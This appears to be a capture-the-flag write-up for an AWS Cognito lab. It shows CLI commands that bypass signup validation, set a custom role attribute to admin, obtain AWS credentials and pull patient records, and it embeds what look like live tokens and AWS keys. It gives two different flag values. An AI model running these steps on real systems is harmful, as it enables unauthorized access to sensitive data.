# Challenge 02 - AWS Cognito Privilege Escalation Solution

## Attack Flow

### Step 1: Reconnaissance
- Navigate to the web application
- Inspect source code to find Cognito configuration
- Extract User Pool ID, Client ID, and Identity Pool ID

### Step 2: Bypass Registration Validation
The frontend validates email domains, but this can be bypassed by registering directly via AWS CLI:

```bash
aws cognito-idp sign-up \
  --client-id '7qmmadbiuvi0emiog8tnqddgf3' \
  --username 'prueba@gmail.com' \
  --password 'SecurePass123!' \
  --user-attributes '[
    {"Name":"given_name","Value":"John"},
    {"Name":"family_name","Value":"Doe"}
  ]'
```

### Step 3: Email Verification
Verify the email address using the confirmation code:

```bash
aws cognito-idp confirm-sign-up \
  --client-id '7qmmadbiuvi0emiog8tnqddgf3' \
  --username 'prueba@gmail.com' \
  --confirmation-code '371844'
```

### Step 4: Login and Extract Tokens
- Login through the web interface
- Extract `access_token` and `id_token` from browser localStorage
- Note the initial `custom:role` attribute is set to `reader`

### Step 5: Privilege Escalation
Update the custom role attribute to escalate privileges:

```bash
aws cognito-idp update-user-attributes \
  --access-token 'eyJraWQiOiIyUHhTbFFmSlZUMFJHWENjN1BjejdJT3ZuZDNIa3JuK0hiZGxyRHpQbDZrPSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiJiNGU4MjQzOC0zMDYxLTcwZmItYjlmZC0yMmNlZjgwZDM5MWIiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV8zTWFTejlZN2kiLCJjbGllbnRfaWQiOiI3cW1tYWRiaXV2aTBlbWlvZzh0bnFkZGdmMyIsIm9yaWdpbl9qdGkiOiJlYjVhM2MyZC1jMWI1LTQ2NGYtOTEyOS03OGU5OTNmOTYzM2UiLCJldmVudF9pZCI6ImFjMjMwYmUzLTM0YjMtNDUyNi1iOTYxLTExZDNhMzAyODljMiIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE3NTg3MzU0MjUsImV4cCI6MTc1ODczOTAyNSwiaWF0IjoxNzU4NzM1NDI1LCJqdGkiOiI0MGIwNTA4YS04NzM0LTRmOTMtODJmMy03Mzc5YTY4ZjlkNGYiLCJ1c2VybmFtZSI6ImI0ZTgyNDM4LTMwNjEtNzBmYi1iOWZkLTIyY2VmODBkMzkxYiJ9.HSjfIMWjrpcT3rn_QtzSWHURQ6A4AGmoUIfFzAJfzkK7Y-SCcnRo6aZq25b0X7VKNtWbWHSLVrzEFY4J5FJI_GViyPppUvsbFvOgouiIE09px8n7XQBckTz4lOtMc5Qldj5VRABFTwkCU5cm2bEc0gKqPXkKY-W1M-tqQExeYNGZyTPYHmDDN-XGOBYTrv7BQlaysNjUci_UZs84q26cUYILJPwDZVpiVUdrOH2L0diAj1Z1f9vUzcKHAnuRnvzMXo0YM-XFBb_2zQ7IRnM9tRZBWKDZf84HxMp2wVxKGDKblFlGB3Nj7nbyfbln2EGPJnAKmb2DYerpdjPrWjcccQ' \
  --user-attributes '[{"Name":"custom:role","Value":"admin"}]'
```

### Step 6: Obtain AWS Credentials
Get Identity Pool credentials using the updated ID token:

```bash
# Get Identity ID
aws cognito-identity get-id \
  --identity-pool-id 'IDENTITY_POOL_ID' \
  --logins "cognito-idp.REGION.amazonaws.com/USER_POOL_ID=ID_TOKEN"

# Get AWS credentials
aws cognito-identity get-credentials-for-identity \
  --identity-id 'IDENTITY_ID' \
  --logins "cognito-idp.REGION.amazonaws.com/USER_POOL_ID=ID_TOKEN"
```

### Step 7: Access the S3 Bucket
Use the obtained AWS credentials to access the S3 bucket:

```bash
export AWS_ACCESS_KEY_ID="ASIA5HCACCPUF77A6WUX"
export AWS_SECRET_ACCESS_KEY="+0weZtMSEyiro1si6R/IBnd5W/U5eUSQRt/y5AHf"
export AWS_SESSION_TOKEN="LONG_SESSION_TOKEN_HERE"

# List the bucket contents
aws s3 ls s3://ctf-25-cognito-flag-UNIQUE_ID/
```

### Step 8: Access the API Gateway Endpoint

With the admin role privileges, you can also access the patient records API:

```bash
# Using the ID token with custom:role = admin
curl 'https://API_GATEWAY_ID.execute-api.us-east-1.amazonaws.com/prod/patients' \
  -H 'Authorization: Bearer YOUR_ID_TOKEN_WITH_ADMIN_ROLE'
```

### Step 9: Extract the Flag from API Response

The API response contains patient records including one admin record with the flag:

```json
{
  "success": true,
  "data": [
    /* ... other patient records ... */
    {
      "department": "administration",
      "diagnosis": "System Maintenance",
      "created_at": "2025-01-21T08:00:00Z",
      "access_level": "admin_only",
      "notes": "CTF{m3d1cl0udx_d4t4b4s3_4cc3ss_pr1v1l3g3_3sc4l4t10n}",
      "status": "active",
      "name": "System Administrator",
      "patient_id": "ADMIN_SYS_007"
    },
    /* ... other patient records ... */
  ],
  "count": 10,
  "message": "Retrieved patient records for MediCloudX Health System"
}
```

### Step 10: Obtain the Flag

The flag is found in the `notes` field of the admin patient record (`ADMIN_SYS_007`):

```
CTF{m3d1cl0udx_d4t4b4s3_4cc3ss_pr1v1l3g3_3sc4l4t10n}
```

## Key Learning Points

1. **Client-side validation is insufficient**: Always implement server-side validation for security controls
2. **Custom attributes security**: Carefully consider which attributes users can modify and implement proper authorization checks
3. **JWT attribute trust**: Never trust client-provided attributes without verification
4. **Role mapping in Cognito**: Identity Pool role mapping based on custom attributes can lead to privilege escalation if not secured properly

## Flag

CTF{c0gn1t0_pr1v1l3g3_3sc4l4t10n_vuln3r4b1l1ty}

## Security Recommendations

1. **Server-side validation**: Implement email domain validation on the backend
2. **Attribute protection**: Mark sensitive custom attributes as admin-only or implement proper authorization
3. **Role mapping**: Use more specific role mapping rules based on verified claims
4. **Least privilege**: Apply principle of least privilege to IAM roles
5. **Token security**: Consider using secure, httpOnly cookies instead of localStorage for token storage
